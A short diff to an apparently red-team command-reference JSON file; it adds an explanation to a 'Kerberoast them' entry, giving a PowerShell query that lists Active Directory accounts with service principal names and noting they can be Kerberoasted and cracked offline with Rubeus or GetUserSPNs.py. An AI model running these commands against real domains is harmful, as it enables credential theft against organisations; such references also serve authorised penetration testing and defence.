@@ -100,5 +100,6 @@
       "label": "Kerberoast them",
       "command": ".\\Rubeus.exe kerberoast /nowrap"
     }
-  ]
+  ],
+  "explain": "Finds Kerberoastable accounts via the ActiveDirectory module:\n  Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"}   users that have any SPN set\n  -Properties ServicePrincipalName                        also return the SPN value\n  | Select SamAccountName, ServicePrincipalName          the useful columns\nAny SPN user can be Kerberoasted (request a TGS, crack it offline); feed the names to Rubeus kerberoast or GetUserSPNs.py."
 }
